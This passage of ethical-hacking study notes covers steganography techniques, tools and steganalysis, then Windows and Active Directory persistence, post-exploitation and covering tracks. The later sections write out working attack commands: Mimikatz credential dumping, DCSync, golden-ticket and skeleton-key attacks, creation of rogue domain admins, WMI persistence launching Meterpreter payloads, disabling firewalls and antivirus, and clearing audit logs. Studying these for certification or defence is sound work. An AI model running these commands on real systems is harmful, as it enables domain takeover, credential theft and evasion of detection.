					- Text Semagram : A text semagram hides a message by altering the appearance of the carrier text, such as changing font sizes and styles, adding extra spaces or white spaces, and incorporating flourishes in letters or handwritten text.
				- Open Codes : Open code conceals a secret message within a legitimate carrier message, designed in a pattern that is unclear to the average reader. The carrier message, also known as overt communication, hides the secret message, referred to as covert communication.
					- Covered Ciphers : This technique conceals the message within a carrier medium that is visible to everyone. The hidden message can be extracted by anyone who knows the method used to embed it.
						- Null Cipher : This technique hides a message within a large amount of irrelevant data. The original message is mixed with the unused data in a specific order—horizontally, diagonally, vertically, or in reverse—making it unintelligible to anyone who does not know the correct order.
						- Grille Cipher : This technique encrypts plaintext by writing it onto a sheet of paper through a pierced (or stenciled) sheet of paper, cardboard, or a similar material. The message can be deciphered using an identical grille. This system is difficult to crack, as only someone with the correct grille can extract the hidden message.
					- Jargon Code : In this type of steganography, a specific language or jargon is used that is meaningful only to a particular group of people, while remaining incomprehensible to others. A jargon code functions similarly to a substitution cipher but replaces entire words instead of individual letters.
		- Types of Steganography based on Cover Medium:
			- Image Steganography :
				- Image File Steganography Techniques:
					- Least-Significant-Bit Insertion : The least-significant-bit (LSB) insertion technique is a widely used method in image steganography, where the rightmost bit of each pixel holds secret data. In this method, the binary data of the message is divided and embedded into the LSB of each pixel in a predetermined sequence. Modifying the LSB causes minimal changes to the image, resulting in no visible difference to the human eye and making detection difficult.
					- Masking and Filtering : Masking and filtering techniques exploit human vision's inability to detect subtle changes in images. Similar to watermarks on paper, these methods use grayscale images or digital watermarks to conceal information. Masking hides secret data by embedding it within an image file.
					- Algorithms and Transformation : The algorithms and transformation technique hides secret information during image compression by applying compression algorithms and transformation functions. This method uses mathematical functions to conceal data by embedding it in the least significant coefficients during the compression process.
						- Types of Transformation used in the Compression Algorithm:
							- Fast Fourier transformation
							- Discrete cosine transformation
							- Wavelet transformation
			- Document steganography
			- Folder Steganography
			- Video Steganography
			- Audio Steganography
				- Audio Steganography Methods:
					- Echo Data Hiding : The echo data hiding method embeds secret information in audio by adding an echo with controlled parameters - amplitude, decay rate, and delay. Imperceptible delay times encode binary data, while the parameters remain below audible thresholds, ensuring the hidden data blends seamlessly with the carrier signal.
					- Spread Spectrum Method:
						- Direct-Sequence Spread Spectrum (DSSS) : DSSS is a frequency modulation technique that spreads a low-bandwidth signal over a broad frequency range, allowing multiple users to share a single channel. In DSSS steganography, secret messages are embedded in radio wave frequencies, though the method may introduce some random noise to the signal.
						- Frequency-Hopping Spread Spectrum (FHSS) : In FHSS, the frequency spectrum of an audio file is rapidly altered, hopping between different frequencies. This spread spectrum method is crucial for secure communications in both commercial and military applications.
						- LSB Coding : LSB encoding embeds a secret binary message in the least significant bit of each audio signal sample, enabling the hiding of large data volumes. While using the last two bits increases capacity, it risks adding noise. However, its poor resistance to manipulation makes it less reliable, as channel noise and resampling can easily reveal hidden data.
						- Tone Insertion : This method embeds data in an audio signal by inserting inaudible low-power tones, concealed by louder audio signals. It is difficult for eavesdroppers to detect the secret message, offering protection against attacks like low-pass filtering and bit truncation. Audio steganography software uses this technique to embed secret data in audio files.
						- Phase Encoding : Phase coding substitutes the phase of an audio segment with a reference phase to represent data. It encodes secret message bits as phase shifts in the phase spectrum of a digital signal, achieving soft encoding with a favorable signal-to-noise ratio.
			- Whitespace Steganography : Whitespace steganography hides messages in ASCII text by appending invisible spaces and tabs to the ends of lines. Since these characters are not typically visible in text viewers, the message remains hidden from casual observers. With built-in encryption, the message remains unreadable even if detected.
			- Web Steganography : In web steganography, a user hides web objects behind other objects and uploads them to a web server.
			- Spam/Email Steganography
			- Natural Text Steganography : Natural text steganography is the process of converting sensitive information into user-defined free text, such as a play.
			- Hidden OS Steganography : Hidden OS steganography is the process of concealing one operating system within another.
			- C++ Source-Code Steganography : In C++ source-code steganography, a user hides a set of tools within the source code files.
			- Compressed Data Steganography : In compressed data steganography, information is hidden in the least significant or reserved bits of compressed files. This technique leverages file compression methods (e.g., ZIP, RAR, JPEG, PNG) to conceal secret data, making it undetectable to unauthorized parties.
		- Steganography Tools:
			- Whitespace:
				- Snow : SNOW conceals messages in ASCII text by appending invisible whitespace (spaces and tabs) to the end of lines, hiding the message from casual observers. If its built-in encryption is used, the message remains unreadable even if detected, exploiting the steganographic nature of whitespace.
			- Image:
				- OpenStego : OpenStego is a steganography application that allows data hiding by embedding any data within an image file and watermarking by adding an invisible signature to image files, which can be used to detect unauthorized copying.
				- Steghide : Steghide is a steganography program that can hide data within various image and audio files. It preserves color and sample frequencies, making the embedded data resistant to first-order statistical tests.
				- StegOnline : StegOnline is an open-source, web-based steganography toolkit designed to simplify the creation and solving of steganography challenges.
				- SSuite Picsel : SSuite Picsel secures text messages using steganographic encryption.
				- CryptaPix : CryptaPix is an image file management and encryption program for Windows that organizes, prints, and secures digital photos and downloaded image files.
				- Gifshuffle : Gifshuffle conceals messages in GIF images by shuffling the colormap, leaving the image visually unchanged. It supports all GIF images, including those with transparency and animation, and also provides compression and encryption for the hidden message.
				- Coagula
			- Document:
				- StegoStick : A steganographic tool that allows users to hide any file within another file. It is based on image, audio, and video steganography, enabling users to conceal files or messages within image formats (BMP, JPG, GIF), audio/video formats (MPG, WAV, etc.), or other file formats (PDF, EXE, CHM, etc.).
				- StegJ : A cross-platform steganography software written entirely in Java, featuring robust AES support.
				- Office XML : Office XML Steganography Tool adds a file to a Microsoft Office document and edits the [Content_Types].xml to prevent Office programs from flagging the file as corrupted.
				- Snow : SNOW conceals messages in ASCII text by appending invisible whitespace (spaces and tabs) to the end of lines, hiding the message from casual observers. If its built-in encryption is used, the message remains unreadable even if detected, exploiting the steganographic nature of whitespace.
				- Data Stash : Data Stash is a steganographic security tool that hides sensitive data files within other files using steganography. A large bitmap, database file, or any other file can be selected as a receptacle, and data files can be added using an easy drag-and-drop mechanism.
			- Video:
				- OmniHide Pro : OmniHide PRO conceals secret files within ordinary images, videos, or music files. The resulting stego file can be used or shared like any normal file, keeping its hidden content undetectable. It also secures the hidden file with a password for added protection.
				- RT Steganography : Real-Time Steganography in Video Streaming Technology enables the transmission of hidden data (text, binary, etc.) within a video while it is being streamed to the recipient.
				- StegoStick : A steganographic tool that allows users to hide any file within another file. It is based on image, audio, and video steganography, enabling users to conceal files or messages within image formats (BMP, JPG, GIF), audio/video formats (MPG, WAV, etc.), or other file formats (PDF, EXE, CHM, etc.).
				- OpenPuff : OpenPuff is a professional steganography tool used to hide data within carrier files such as images, audio, videos, or other media formats. It supports multi-level security by combining password protection, cryptographic techniques, and carrier chaining (splitting the hidden data across multiple carriers).
				- MSU StegoVideo : MSU StegoVideo is a unique tool for hiding any file within a video sequence, available as a VirtualDub filter or standalone executable.
			- Audio:
				- DeepSound : DeepSound is a steganography tool and audio converter that hides secret data within audio files. It also extracts hidden files directly from audio files or CD tracks.
				- BitCrypt : BitCrypt is an advanced encryption utility that enables the undetectable storage and transmission of information. It can be used to store plaintext securely, hiding it from third parties, or to transmit information over the Internet.
				- StegoStick : A steganographic tool that allows users to hide any file within another file. It is based on image, audio, and video steganography, enabling users to conceal files or messages within image formats (BMP, JPG, GIF), audio/video formats (MPG, WAV, etc.), or other file formats (PDF, EXE, CHM, etc.).
				- MP3Stego : MP3Stego hides information in MP3 files during the compression process by first compressing and encrypting the data, then embedding it into the MP3 bitstream.
				- QuickCrypto : Hide files on the system so only the owner can recover and access them. Conceal sensitive data (text and any file type) within innocent 'carrier' files like JPEG, GIF, BMP, MP3, and WAV. Easily blend encrypted files and messages into various other files.
				- Spectrology : Images to audio files with corresponding spectrograms encoder.
			- Folder:
				- GiliSoft File Lock Pro : It is a military-grade encryption tool that secures files by locking folders on internal and external drives, including USB, flash, thumb, memory cards, and network drives. It encrypts, hides, and makes files, folders, and drives read-only, as well as password-protects them.
				- Folder Lock : File locking software that Locks folders and Encrypts files.
				- Hide Folders 5 : Hide Folders is a software application that password-protects private information on a hard drive, allowing files and folders to be made inaccessible, invisible, or protected from modification or removal.
				- InvisibleSecrets : Encrypt file contents, hide files and emails, and prevent unauthorized access to private documents.
				- QuickCrypto : Hide files on the system so only the owner can recover and access them. Conceal sensitive data (text and any file type) within innocent 'carrier' files like JPEG, GIF, BMP, MP3, and WAV. Easily blend encrypted files and messages into various other files.
			- Spam/Email:
				- Spam Mimic : Spam Mimic is a spam "grammar" for a mimic engine created by Peter Wayner. It encodes secret messages into innocent-looking spam emails. The tool's encoder hides the secret message within spam, using elements like a password, fake PGP, fake Russian text, and spacing.
		- Steganalysis:
			- Steganalysis is the process of detecting and extracting covert messages hidden using steganography. It identifies hidden messages embedded in images, text, audio, and video carrier mediums, serving as the reverse process of steganography.
			- Steganalysis has two aspects: detection and distortion of messages. In the detection phase, the analyst examines the relationships between the steganography tools, stego-media, cover, and message. In the distortion phase, the analyst manipulates the stego-media to extract the embedded message and determines if it is useless and should be removed.
			- Steganalysis Methods/ Attacks on Steganography:
				- Stego-only : In a stego-only attack, the steganalyst or attacker only has access to the stego-medium or stego-object, with no additional information. The goal is to try every possible steganography algorithm and related attack to recover the hidden information.
				- Known-stego : This attack allows the attacker to know the steganography algorithm, as well as both the original and stego-objects, enabling the extraction of the hidden information using the available data.
				- Known-message : The known-message attack assumes access to both the message and the stego-medium. With this information, the attacker can detect the technique used to hide the message.
				- Known-cover : In a known-cover attack, attackers have access to both the stego-object and the original cover medium. This allows them to compare the two and detect changes in the medium's format to uncover the hidden message.
				- Chosen-message : In this attack, the steganalyst uses a known message to generate a stego-object with various steganography tools, aiming to identify the algorithm used to hide the information. The goal is to detect patterns in the stego-object that may indicate the specific steganography tools or algorithms employed.
				- Chosen-stego : The chosen-stego attack occurs when the steganalyst knows both the stego-object and the steganography tool or algorithm used to hide the message.
				- Chi-square : The chi-square method uses probability analysis to test whether a stego-object and the original data are identical. If the difference is nearly zero, no data is embedded; otherwise, the stego-object contains hidden data.
				- Distinguishing Statistical : In the distinguishing statistical method, the steganalyst or attacker analyzes statistical changes caused by the embedded algorithm, along with the length of the hidden data, to detect the presence of embedded information.
				- Blind Classifier : In the blind classifier method, a blind detector is provided with the original or unmodified data to learn its characteristics from multiple perspectives. The output is then used to train a classifier to detect differences between the stego-object and the original data.
			- Detecting Steganography:
				- Text File : In text steganography, data is hidden by altering character positions, which can be detected through patterns, language use, line height, or unusual blank spaces. A simple word processor may reveal these alterations by displaying spaces, tabs, and other hidden characters. Detection can focus on unusual patterns, extra spaces, and invisible characters in the stego-object.
				- Image File : Hidden information in an image can be detected by analyzing changes in size, file format, timestamps, and the color palette. Key detection indicators include display distortions, image degradation, anomalies in color composition, luminance, pixel relationships, and exaggerated noise. Statistical analysis helps identify steganography by examining the least significant bits (LSBs), which become non-random when a secret message is embedded. By comparing LSBs with random values, statistical methods can reveal hidden data, particularly when encrypted data with high entropy is used.
				- Audio File : Audio steganography embeds confidential information, such as private documents and files, into digital sound. Statistical analysis can detect it by examining LSB modifications and scanning inaudible frequencies for hidden data. Odd distortions and patterns in the audio signal often reveal the presence of secret information.
				- Video File : Detection of secret data in video files combines methods used for both image and audio files. Special code signs and gestures can also assist in identifying hidden information.
		- Steganography Detection Tools:
			- zsteg : The zsteg tool is used to detect stegano-hidden data in PNG and BMP image files.
			- StegoVeritas : StegoVeritas is a versatile steganography tool that supports multiple image types and default actions, with options for tasks like extracting LSB, color mapping, and more.
			- Stegextract : Stegextract is a Bash script that extracts hidden files and strings from images, supporting PNG, JPG, and GIF formats. It retrieves trailing data after the image's closing bytes and any hidden files embedded within the image.
			- StegoHunt MP : StegoHunt MP is the next generation of WetStone’s industry-leading steganography detection and steganalysis suite. It effectively detects the presence of steganography and data-hiding programs, as well as the carrier files in which hidden data payloads may reside.
			- Steganography Studio : Steganography Studio is a tool for learning, using, and analyzing key steganographic algorithms. It implements several highly configurable algorithms with various filters, as well as advanced image analysis algorithms for detecting hidden information.
			- Virtual Steganographic Laboratory (VSL) : The Virtual Steganographic Laboratory (VSL) is a graphical block diagramming tool that enables the use, testing, and adjustment of methods for both image steganography and steganalysis. VSL features a simple GUI and a modular, plug-in architecture.
- Establishing Persistence
	- Maintaining Persistence Using Windows Sticky Keys:
		- In Windows, the Sticky Keys feature allows users to use modifier keys like Ctrl, Alt, and Shift without pressing them simultaneously. Attackers can exploit this feature to maintain persistence. After gaining access to a remote system, attackers can escalate their privileges using the BypassUAC exploit in Metasploit. Once privileges are escalated, they can use the Sticky Keys module in Metasploit to maintain persistence on the compromised system. When the attacker restarts the system and presses the Shift key five times, a Command Prompt window opens with system-level access.
	- Maintaining Persistence by Abusing Boot or Logon Autostart Executions:
		- Attackers exploit system boot or logon autostart programs to escalate privileges and maintain persistence by applying custom configuration settings on a compromised machine. This allows attackers to automatically run programs during system boot or logon. They typically use two methods to abuse autostart execution: registry run keys and startup folders.
		- Executing Logon Autostart:
			- Registry Run Keys:
				- Enumerating Assign Permissions Using WinPEAS:
					- Attackers can use the WinPEAS script to identify potential paths for privilege escalation within Windows.
					- Enumerate permissions: winPEASx64.exe quiet applicationinfo
					- This command enables attackers to enumerate all permissions assigned to a valid user for a specific service.
			- Startup Folder:
				- Attackers can inject malicious applications into the startup folder, causing them to run automatically when a user signs into their account. They can escalate privileges by exploiting and manipulating the startup folder's locations.
				- Abusing Startup Folder Using icacls:
					- Misconfigured locations in a startup folder can be exploited by attackers to inject malicious payloads, such as Remote Access Trojans (RATs), enabling them to maintain persistence.
					- Enumerate permissions: icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
				- Using Sysinternals tool (accesschk.exe) for Identifying Permissions:
					- accesschk.exe /accepteula "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
	- Domain Dominance Through Different Paths:
		- Domain dominance is the process of gaining control over critical assets, such as domain controllers, on a target system to access other networked resources. Attackers often use social engineering techniques to launch domain dominance attacks by compromising an internal user.
		- Domain Dominance Techniques:
			- Remote Code Execution:
				- Attackers attempt to execute malicious code on the target domain controller (DC) via the command-line interface (CLI) to initiate a domain dominance attack. By leveraging this technique, attackers can maintain persistence, enabling them to carry out malicious activities over an extended period without detection.
				- Steps:
					- Create a Dummy Process and User on the Target DC - Use WMI to create a dummy user and process on the target domain controller (DC):
						- wmic /node:<DomainControllerName> process call create "net user /add PiratedProcess Du^^Y01"
						- Here, PiratedProcess is the username, and Du^^Y01 is the password for the dummy user created on the target DC.
					- Add the User to the "Admins" Group: PsExec.exe \\<DomainControllerName> -accepteula net localgroup "Admins" PiratedProcess /add
					- Identify the Created User in Active Directory Users and Computers (ADUC) - Navigate to Active Directory Users and Computers (ADUC) and locate the user created using the above command.
					- Verify Membership in the "Admins" Group - Open the properties window for the created user in ADUC. Navigate to the Member Of tab to confirm their membership in the "Admins" group.
					- After successfully adding a new user to the "Admins" group, the attacker uses the newly created credentials to maintain persistence on the target domain controller (DC).
			- Abusing Data Protection API (DPAPI):
				- The Data Protection API (DPAPI) is a unified framework in Windows environments that securely stores cryptographically protected files, browser passwords, and other sensitive data. Windows domain controllers (DCs) hold a master key that can decrypt DPAPI-protected files.
				- Recover the master key with Mimikatz using the password of a compromised user.
				- Retrieve all local master keys with compromised admin credentials: sekurlsa::dpapi
				- Retrieve all backup master keys: lsadump::backupkeys /system:dc01.offense.local /export
				- Cross-check whether the secured master keys have been obtained by navigating to the directory containing the mimikatz.exe file and looking for file formats such as .der, .key, .pvk, and .pfx. By obtaining the master key, the attacker can decrypt any DPAPI-encrypted file from any device on the network, enabling them to maintain persistence.
			- Malicious Replication:
				- It allows attackers to create an exact copy of user data using administrative credentials. Attackers often target sensitive accounts, such as "krbtgt," to replicate them.
				- Malicious replication: Invoke-Mimikatz -command '"lsadump::dcsync /domain:<Target Domain> /user:<krbtgt>\<Any Domain User>"
			- Skeleton Key Attack:
				- A skeleton key is a type of malware that attackers use to inject false credentials into domain controllers, creating a backdoor password. It is a memory-resident virus that allows an attacker to obtain a master password, enabling them to authenticate as a legitimate user within the domain.
				- Working of the Skeleton Key Attack:
					- This attack is straightforward and only requires executing misc::skeleton on each domain controller.
					- Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' - <target domain controller name>
					- With this, the attacker can masquerade as any user using the default Mimikatz credentials.
					- Attackers can also execute skeleton key attacks by patching the Local Security Authority Subsystem Service (LSASS). They leverage their access to the domain to install malware on the domain controllers (DCs), which then auto-patches the LSASS, generating a new skeleton key or master password that works for all users.
					- The error shown in the above screenshot appears if LSASS has already been patched with skeleton keys. Alternatively, attackers can use the Empire tool, which includes a module that automates the process by running Mimikatz entirely in memory, preventing the binary from being dropped on the domain controller (DC).
					- powershell/persistence/misc/skeleton_key
			- Golden Ticket Attack:
				- A golden ticket attack is a post-exploitation technique used by attackers to gain complete control over the entire Active Directory (AD). Attackers execute this attack by exploiting the Kerberos authentication protocol, forging Ticket Granting Tickets (TGTs) after compromising a Key Distribution Center (KDC) account (KRBTGT), which grants access to various resources. This attack enables attackers to maintain persistence and gather more information within the AD by masquerading as privileged users.
				- Working of Golden Ticket Attack:
					- Attackers typically compromise a valid user account either through phishing emails or by exploiting vulnerabilities or security misconfigurations.
					- Attackers gather domain information, such as the domain name and domain security identifier (SID), using the whoami command.
					- Elevate privileges to the domain administrator-level account to steal the NTLM hash of KRBTGT. Use Mimikatz to perform a pass-the-hash or DCSync attack to extract KRBTGT's password hash:
					- lsadump::dcsync /domain:<domain_name> /user:krbtgt
					- After obtaining the password hashes, use the Mimikatz command to create a golden ticket by impersonating an administrator-level user. This grants access to any resource, group, or domain within the environment:
					- kerberos::golden /domain:<domain_name> /sid:<SID> /rc4:<KRBTGT_hash> /id:<value> /user:<username>
					- The final step can also be executed using the NTLM hashes obtained from a malicious replication process.
					- Attackers maintain persistence by configuring the ticket's validity period. 
			- Silver Ticket Attack:
				- A silver ticket attack is a post-exploitation technique used by attackers to steal legitimate users’ credentials and forge a fake Kerberos Ticket Granting Service (TGS) ticket. To initiate this attack, the attacker must have access to credentials obtained from a local service account or the system’s SAM database. The attacker then creates a forged Kerberos TGS ticket using the Mimikatz tool to establish a connection with the target service.
				- The attacker initially compromises the target system through techniques such as phishing or vulnerability exploitation. After gaining access to a networked system, the attacker initiates the silver ticket attack by forging a false Kerberos silver ticket.
					- The attacker gathers domain information, such as the domain name and domain security identifier (SID), using the whoami command.
					- The attacker obtains additional details about the service or service type to target.
					- The attacker deploys password-cracking tools, such as Mimikatz, on the compromised system to extract the Kerberos service’s local NTLM password hash.
					- The attacker initiates offline password attacks, such as Kerberoasting, to obtain a raw or plaintext password for the service.
					- The attacker forges a Kerberos TGS ticket using Mimikatz to establish a connection with the target service.
					- The attacker uses both the forged TGS and the hash data to authenticate the local service as a legitimate user.
					- The attacker exploits the TGS to elevate privileges and permissions.
					- Note: Privilege Attribute Certificate (PAC) validation requests and PAC validation responses are optional in a silver ticket attack.
					- If an attacker successfully elevates privileges and obtains admin rights to execute code on a local machine, they can run the following command to retrieve the NTLM hashes of the AD system’s password:
					- mimikatz “privilege::debug” “sekurlsa::logonpasswords”
	- Maintain Domain Persistence Through AdminSDHolder:
		- AdminSDHolder is an object in Active Directory that protects user accounts and groups with high privileges from accidental modifications to security permissions. Attackers with admin privileges on a compromised domain can abuse the SDProp process to establish persistence. They can add a user account to the ACL to gain "GenericAll" privileges, which are equivalent to the privileges of a domain administrator.\
		- Establishing Domain Persistence by Abusing AdminSDHolder:
			- Add user account Martin to the ACL:
				- Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Verbose -Rights All
			- SDProp process retrieves the ACL to check whether the Martin account has “GenericAll” permissions:
				- Get-ObjectAcl -SamAccountName "Martin” -ResolveGUIDs
			- Change the default time of SDProp to 3 min by modifying the registry:
				- REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300
			- Add the account Martin to the group Domain Admins using the following command:
				- net group “Domain Admins” Martin /add /domain
			- Check the accessibility of the domain controller (DC) through which domain persistence is created:
				- dir \\10.10.1.22\c$
	- Maintaining Persistence Through WMI Event Subscription:
		- Attackers exploit Windows Management Instrumentation (WMI) event subscriptions to execute malicious content and establish persistence on a target system. By leveraging various scripts and techniques, they manipulate WMI's features to create event subscriptions for malicious triggers. When these events occur, they initiate the execution of arbitrary code, enabling attackers to maintain persistence. These scripts further automate the process by concealing malicious payloads and ensuring persistence, even after the system is rebooted or restarted.
		- Techniques to Maintain Persistence Using WMI Event Subscription:
			- Using Command Prompt:
				- Use wmic commands create a malicious namespace and subscription for the events:
					- eSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
					- wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="EthicalHacker", ExecutablePath="C:\Windows\System32\ethicalhacker.exe",CommandLin eTemplate="C:\Windows\System32\thicalhacker.exe"
					- wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"EthicalHacker\"", Consumer="CommandLineEventConsumer.Name=\"EthicalHacker\""
				- The malicious payload is designed to automatically execute within 60 seconds of every system restart, establishing a Meterpreter session with the attacker.
			- Using Wmi-Persistence:
				- Attackers also utilize Wmi-Persistence, a PowerShell script, to perform WMI event subscriptions and achieve persistence. This script triggers various actions, including Startup, Logon, Interval, and Timed events, enabling attackers to execute multiple functions such as the installation, review, and removal of WMI event subscriptions.
				- Execute malicious payload on the compromised system and achieve persistence:
				- Install-Persistence -Trigger Startup -Payload "c:\windows\system32\ethicalhacker.exe"
				- The above command includes a Startup trigger that executes the specified payload within 5 minutes of a system reboot, establishing a Meterpreter session with the attacker.
			- Using PowerLurk:
				- PowerLurk is a PowerShell toolset for creating malicious WMI event subscriptions. The goal of PowerLurk is to simplify the process of triggering WMI events during penetration tests or red-team engagements. Attackers use PowerLurk to create malicious WMI event subscriptions that execute arbitrary payloads on every Windows logon. This script can trigger events such as InsertUSB, UserLogon, Timed, Interval, and ProcessStart.
				- Import the PowerLurk script to a local instance: Import-Module .\PowerLurk.ps1
				- Identify all the active WMI event objects: Get-WmiEvent
				- Create a malicious event subscription that executes the malicious payload and creates a Meterpreter session:
				- Register-MaliciousWmiEvent -EventName Logonlog -PermanentCommand "ethicalhacker.exe" -Trigger UserLogon -Username any
	- Overpass-the-Hash Attack:
		- The Overpass-the-Hash (OPtH) attack is an extension of the Pass-the-Ticket and Pass-the-Hash attacks. It is a type of credential theft-and-reuse attack that allows attackers to perform malicious activities on compromised devices or within a compromised environment. The primary goal of an OPtH attack is to acquire Kerberos tickets using the NTLM hash of different user accounts.
		- Mimikatz to perform OPtH attacks:
			- The Mimikatz tool allows attackers to obtain and store various authentication credentials, such as Kerberos tickets. It aids attackers in stealing credentials and performing privilege escalation.
			- Perform the attack and obtain AES128, NTLM (RC4), and AES256 keys for a Kerberos ticket:
				- privilege::debug
				- sekurlsa::ekeys
	- Linux Post-Exploitation:
		- After compromising a target system and gaining shell access, attackers typically attempt further exploitation to gain full access to additional resources and establish long-term persistence.
		- File-System Commands:
			- Discovers SUID-executable binaries: find / -perm -3000 -ls 2> /dev/null
			- Discovers world-writable files : find / -path /sys -prune -o -path /proc -prune -o -type f -perm -o=w - ls 2> /dev/null
			- Disables write access to a file : chmod o-w file
			- Discovers world-writable directories : find / -path /sys -prune -o -path /proc -prune -o -type d -perm -o=w - ls 2> /dev/null
			- Discovers .txt files on the system : find / -name "*.txt" -ls 2> /dev/null
			- Displays the list of permitted and forbidden commands : sudo -l
			- Displays all certificates’ details : openssl s_client -connect <hostname>:<port> -showcerts
			- Displays contents of keystore files and alias names : keytool -list -v -keystore keystore.jks
		- Information-Gathering Commands:
			- Displays the current process along with its process ID (PID) : ps -ef
			- Attaches a file system to the directory tree structure : mount
			- Displays host/network names in numeric form : route -n
			- Displays network configuration details : /sbin/ifconfig -a
			- Displays running cron jobs : cat /etc/crontab
			- Displays the software package used for the specified cron job : ls -la /etc/cron.d
			- Displays directories that can be exported to NFS clients : cat /etc/exports
			- Displays the OS version details : cat /etc/redhat* /etc/debian* /etc/*release
			- Lists bootup services : ls /etc/rc*
			- Displays all the users who have shell access : egrep -e '/bin/(ba)?sh' /etc/passwd
			- Displays SSH relationships and login details : cat ~/.ssh/
			- Display information about the CPU(s) on the machine: cat /proc/cpuinfo
			- Display information about the system's memory usage: cat /proc/meminfo
	- Windows Post-Exploitation:
		- Once attackers compromise a system and gain shell access, they can carry out various malicious activities without the user's knowledge. The primary goal of post-exploitation is to gain full control over the system and maintain persistence over time.
		- File-System Commands:
			- Retrieves the directory names with hidden attributes : dir /a:h
			- Retrieves all the text files : findstr /E ".txt" > txt.txt
			- Retrieves all the log files : findstr /E ".log" > log.txt
			- Retrieves all the document files : findstr /E ".doc" > doc.txt
		- Hash Computing Commands:
			- Generates MD5 hashes : Get-FileHash <file-name> -a md5
			- Generates SHA-1 hashes : Get-FileHash <file-name> -a sha1
			- Retrieves SHA-256 hashes by default : Get-FileHash <file-name>
		- Registry Commands:
			- Detects the registry hives for the value “credential” : reg query HKEY_LOCAL_MACHINE/f credential /t REG_SZ /s > hklm_password.txt
			- Checks whether any package is installed with elevated privileges. If value is "1", the installer uses elevated privileges for installing applications : reg query HKEY_LOCAL_MACHINE\SOFTWARE\P olicies\Microsoft\Windows\I nstaller /v AlwaysInstallElevated > reg_always.txt
			- Provides a list of all programs to query a registry : reg query HKEY_LOCAL_MACHINE\Software\M icrosoft\Windows\CurrentVer sion\Uninstall >> ListofInstalledPrograms.txt
		- Scheduler Commands:
			- Retrieves the scheduled task list : schtasks /query /fo LIST /v > schtasks.txt
			- Retrieves all currently active processes : tasklist /SVC > tasklist.txt
		- WMIC Commands:
			- Reboots Windows : wmic os Primary='TRUE' reboot
			- Retrieves the service name, path of the executable, etc. : wmic service get name,displayname,pathname,s tartmode > wmic_service.txt
			- Displays the details of the installed software : wmic /node:"" product get name,version,vendor
			- Retrieves the processor’s details : wmic cpu get
			- Retrieves login names and their SIDs : wmic useraccount get name,sid
		- Net Commands:
			- Shows domain connection details : net config rdr
			- Adds a computer to the domain : net computer \\computername /add
			- Displays the list of computers and networks devices in the domain : net view
			- Displays the name of the host computer : net view \\host
			- Helps manage shared resources with the appropriate parameters : net share
		- Network Commands:
			- Displays routing tables for the destination : route print or netstat -r command
			- Shows the ARP table for a specific IP address : arp -a
			- Displays IP configuration details : ipconfig /all
			- Retrieves the physical address : getmac
		- Service Commands:
			- Lists all the available services : sc queryex type=service state=all
			- Lists details about the specified service : sc queryex type=service state=all | find /i "Name of the service: myService"
			- Starts/stops a network service : net start or stop
			- Displays the current firewall state : netsh firewall show state
			- Displays firewall settings : netsh firewall show config
			- Turns off the firewall service for the current profile : etsh advfirewall set currentprofile state off
			- Turns off the firewall service for all profiles : netsh advfirewall set allprofiles state off
		- Remote Execution Commands:
			- Retrieves the PC’s serial number : wmic /node:<IP address> /user:administrator /password:$PASSWORD bios get serialnumber
			- Terminates services associated with eset : taskkill.exe /S <IP address> /U domain\username /F /FI "eset"
			- Defines the user context to execute commands : tasklist.exe /S <IP address> /U domain\username
			- Retrieves all the processes running on the system that are not actually “SYSTEM” : tasklist.exe /S <IP address> /U domain\username /FI "USERNAME eq NT AUTHORITY\SYSTEM" /FI "STATUS eq running"
		- Sysinternals Commands:
			- Establishes an interactive CMD with a remote system : psexec -i \\<RemoteSystem> cmd
			- Copies file.txt from the local machine to a remote computer : psexec -i \\<RemoteSystem> -c file.exe
			- Retrieves the contents of security keys and SAM : psexec -i -d -s c:\windows\regedit.exe
			- Displays a remote system’s network information : psexec -i \\<RemoteSystem> ipconfig /all
		- Authenticated WMI Exec via PowerShell:
			- Launches a suitable local exploit : msf > use exploit/windows/local/ps_wmi_exec
			- Displays the list of targets : msf exploit(windows/local/ps_wmi_exec) > show targets
			- Displays all the available options : msf exploit(windows/local/ps_wmi_exec) > show options
			- Displays possible payloads : msf exploit(windows/local/ps_wmi_exec) > show payloads
			- Displays suitable evasion options : msf exploit(windows/local/ps_wmi_exec) > show evasion


## Clearing Logs
- Covering Tracks
	- Once intruders have successfully gained administrator access to a system, they will attempt to cover their tracks to avoid detection.
	- Covering tracks is a key stage in system hacking where attackers erase or alter logs, error messages, and system configurations to avoid detection. By manipulating event logs and file attributes, they make it appear as if no compromise occurred, often using rootkits to disable logs. If maintaining long-term access, attackers selectively remove evidence from logs and restore file attributes. Detecting such changes can be difficult, but file hashes can identify tampered files.
	- Manipulate the log files:
		- SECEVENT.EVT (security) : failed logins, accessing files without privileges
		- SYSEVENT.EVT (system) : driver failure, things not operating correctly
		- APPEVENT.EVT (applications)
	- Techniques Used for Covering Tracks:
		- Disabling Auditing:
			- An attacker disables the auditing features of the target system.
			- Auditpol : Auditpol displays information about and allows manipulation of audit policies. Auditpol.exe is the command-line utility used to modify audit security settings at the category and sub-category levels. Attackers can use Auditpol to enable or disable security auditing on local or remote systems and adjust audit criteria for various categories of security events.
			- Enabling system auditing: C:\>auditpol /set /category:”system”,”account logon” /success:enable /failure:enable
			- Disabling system auditing: C:\>auditpol /set /category:”system”,”account logon” /success:disable /failure:disable
			- View defined auditing settings: auditpol /get /category:*
		- Clearing Logs:
			- An attacker clears or deletes system log entries related to their activities.
			- Clear_Event_Viewer_Logs.bat : Clear_Event_Viewer_Logs.bat is a utility used to wipe out the logs on the target system. It deletes the security, system, and application logs to cover the attacker’s tracks.
			- If the system is compromised with Metasploit, the attacker can use a Meterpreter shell to clear all logs from the Windows system. To do this, the attacker launches the Meterpreter shell prompt from the Metasploit Framework, then types the "clearev" command in the Meterpreter shell prompt and presses Enter. This will initiate the process of wiping out the logs on the target system.
